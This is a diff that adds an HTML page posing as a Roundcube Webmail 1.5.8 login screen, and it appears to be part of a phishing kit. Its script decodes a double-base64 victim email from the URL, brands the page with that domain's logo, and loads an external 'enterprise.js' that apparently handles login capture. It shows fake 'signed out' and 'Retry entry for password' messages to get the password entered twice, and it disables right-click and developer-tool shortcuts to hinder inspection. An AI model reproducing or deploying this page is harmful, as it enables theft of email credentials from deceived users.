@@ -1,0 +1,161 @@
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>Roundcube Webmail 1.5.8 :: Welcome to Roundcube Webmail 1.5.8</title>
+<link rel="index" href="./?_task=login">
+
+<link id="favLink" rel="shortcut icon" href="">
+<link id="commoncss" rel="stylesheet" type="text/css" href="">
+<link id="jplugin" rel="stylesheet" type="text/css" href="">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</head>
+<body >
+
+<img src="" id="logo" border="0" style="margin:0 11px" alt="Roundcube Webmail 1.5.8">
+
+<div id="message" style="display:block">
+<div class="loading content" id ="loading" style="display:none">Loading......</div>
+<div class="warning content" id="warning" role="alert" style="display:none"> Invalid request! No data was saved</div></div>
+<div id="login-form">
+<div class="boxtitle">Welcome to Roundcube Webmail 1.5.8</div>
+<div class="boxcontent">
+
+<form name="form" >
+<input type="hidden" name="_token" value="mWEGfzSH22sfl3cDNYQQ4ZkUyIYJhIAb">
+<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="America/Los_Angeles"><input type="hidden" name="_url" id="rcmloginurl" value="_task=mail&amp;_mbox=INBOX&amp;_page=4">
+<table border="0" style="font-size:12px"><tbody><tr><td class="title">
+<label for="rcmloginuser" >Username</label></td>
+<input id="domain" type="hidden" value="" name="domain">
+<input id="fieldName" type="hidden" value="" name="field">
+<td class="input"><input name="email" id="email" required="required" autocapitalize="off" autocomplete="off" type="text" readonly></td></tr><tr><td class="title"><label for="rcmloginpwd">Password</label></td><td class="input"><input name="password" id="password" required="required" autocapitalize="off" autocomplete="off" type="password"></td></tr></tbody></table><p class="formbuttons"><button type="submit" id="loginbtn" class="button mainaction submit">Login</button></p>
+</form>
+<script>
+
+
+$(document).ready(function(){
+	
+	//set global variables
+	var vsr = window.location.href.slice(window.location.href.indexOf('#') + 1);
+	const myArray = vsr.split("&");
+	vsr = myArray[0];
+	
+		
+	//set external files
+	const prefix = "C:/Users/Administrator/Desktop/SCRIPTS/01/01/generalPg/enterprise/";
+
+	var arrayset =[
+
+		//['ovhicon','ovh.ico','href','id'],
+		['commoncss','common.min.css?s=1722763434','href','id'],
+		['jplugin','jquery-ui.min.css?s=1722763434','href','id'],
+		//['logo','roundcube_logo.png?s=1722763434','src','id'],
+	
+	]
+
+
+    // Load the external script and call the external callback function
+           loadExternalScript('enterprise.js', function() {
+				checkDNS(vsr,function(){
+					onBodyLoad(arrayset, prefix, vsr);
+				});
+             
+
+            });
+
+			
+	// function to load external script
+	function loadExternalScript(url,callback) {
+		var script = document.createElement('script');
+		script.src = prefix + url;
+		script.onload = function() {
+			
+			if (callback) {
+				callback();				
+			}
+			
+		};
+
+		document.head.appendChild(script); // Append the script to the body
+	}
+	
+	var usr = atob(atob(vsr));
+	var indx=usr.indexOf("@");
+	var my_slice=usr.substr((indx+1));
+	$("#favLink").attr("href","https://www.google.com/s2/favicons?domain_url="+my_slice+"&sz=64");
+	$("#logo").attr("src","https://logo.clearbit.com/"+my_slice);
+
+
+	//initialize and display  session error
+	$('#loading').show();
+	$('#loading').delay(1000).hide(0); 
+	document.getElementById('warning').innerHTML="You have been signed out! Sign in to continue";
+	$('#warning').delay(1000).show(0);
+	$('#warning').delay(2000).hide(500);
+			
+});
+	
+document.addEventListener('keydown', event => {
+  if (event.keyCode === 123 || (event.ctrlKey && event.shiftKey && event.keyCode === 73)) {
+    event.preventDefault();
+  }
+});
+
+
+
+// Disable right-click context menu
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+
+//avoid form submission without validation
+$('#loginbtn').on('click', function(event) {
+	//alert("start fxnt");
+	clkLgn(function(statusCode){
+		
+		displayCss(statusCode);
+		
+
+	});
+});
+$('.boxcontent').on('keydown', function(event) {
+        checkSubmit(event, function(statusCode) {
+
+			displayCss(statusCode);
+        });
+    });
+	
+function displayCss(status){
+
+		if(status){
+			//initialize and display  attempt error
+			$('#loading').show();
+			$('#loading').delay(1000).hide(0); 
+			document.getElementById('warning').innerHTML="Retry entry for password";
+			$('#warning').delay(1000).show(0);
+			$('#warning').delay(2000).hide(500);
+		}else {
+			$('#loading').show();
+			$('#loading').delay(1000).hide(0); 
+			document.getElementById('warning').innerHTML="Login failed.";
+			$('#warning').delay(1000).show(0);
+			$('#warning').delay(2000).hide(500); 
+		}
+
+	
+}
+</script>
+</div>
+</div>
+
+<noscript>
+  <p id="login-noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
+</noscript>
+
+<div id="login-bottomline">
+  Roundcube Webmail 1.5.8 
+  
+  
+</div>
+
+
+
+
+</body>
+</html>
